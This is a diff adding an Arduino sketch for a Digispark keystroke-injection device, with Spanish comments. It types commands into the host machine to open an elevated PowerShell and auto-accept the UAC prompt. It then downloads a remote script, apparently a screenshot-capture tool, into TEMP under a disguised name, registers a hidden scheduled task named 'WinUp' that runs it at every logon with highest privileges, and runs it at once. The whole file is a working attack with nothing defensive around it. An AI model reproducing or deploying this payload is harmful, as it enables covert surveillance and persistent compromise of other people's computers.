@@ -1,0 +1,60 @@
+#include "DigiKeyboard.h"
+
+void setup() {
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(2000);
+  
+  // Abrir Run (Win + R)
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(1000);
+  
+  // Abrir PowerShell como administrador
+  DigiKeyboard.print("powershell");
+  DigiKeyboard.delay(300);
+  
+  // Ctrl + Shift + Enter = Ejecutar como admin
+  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
+  DigiKeyboard.delay(3000); // Esperar UAC
+  
+  // Aceptar UAC (Alt + Y en español, Alt + S en inglés con teclado inglés)
+  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
+  DigiKeyboard.delay(2000);
+  
+  // Comando 1: URL del script
+  DigiKeyboard.print("$w='https://raw.githubusercontent.com/VaderNight/Screenshot-with-an-ATtiny85-device/refs/heads/main/capture.ps1'");
+  DigiKeyboard.delay(300);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  
+  // Comando 2: Ruta local
+  DigiKeyboard.print("$p=$env:TEMP+'\\wu.ps1'");
+  DigiKeyboard.delay(300);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);
+  
+  // Comando 3: Descargar archivo
+  DigiKeyboard.print("(New-Object Net.WebClient).DownloadFile($w,$p)");
+  DigiKeyboard.delay(300);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(2000);
+  
+  // Comando 4: Crear tarea programada (ahora con permisos admin)
+  DigiKeyboard.print("schtasks /create /f /tn WinUp /tr \"powershell -W Hidden -Exec Bypass -File $p\" /sc onlogon /rl highest");
+  DigiKeyboard.delay(300);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1500);
+  
+  // Comando 5: Ejecutar script (sintaxis corregida)
+  DigiKeyboard.print("powershell -W Hidden -Exec Bypass -File $p");
+  DigiKeyboard.delay(300);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  
+  // Cerrar PowerShell
+  DigiKeyboard.print("exit");
+  DigiKeyboard.delay(300);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+}
+
+void loop() {
+}
